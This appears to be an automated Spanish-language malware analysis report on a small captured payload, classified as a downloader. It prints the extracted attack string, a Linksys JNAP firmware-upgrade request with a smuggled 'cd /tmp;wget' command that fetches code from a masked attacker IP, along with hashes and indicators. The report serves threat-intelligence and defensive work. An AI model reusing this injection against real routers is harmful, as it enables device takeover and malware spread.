# 🧬 Payload Analysis

`3b06f8091b35d5cc01eef33f6d6a45291aa1ea841e049e6f90e57133ed3cd357`

## 📌 Resumen

Texto ASCII de 444 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/w` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/3b06f8091b35d5cc01eef33f6d6a45291aa1ea841e049e6f90e57133ed3cd357.md](../../../../../malware-like/oraculo/downloader/3b06f8091b35d5cc01eef33f6d6a45291aa1ea841e049e6f90e57133ed3cd357.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3b06f8091b35d5cc01eef33f6d6a45291aa1ea841e049e6f90e57133ed3cd357`
- **MD5:** `b2cb648bb8508b861cd9d20c99102aa7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 444 B |
| Entropía | 5.38 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w | strings |
| hash | 3b06f8091b35d5cc01eef33f6d6a45291aa1ea841e049e6f90e57133ed3cd357 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
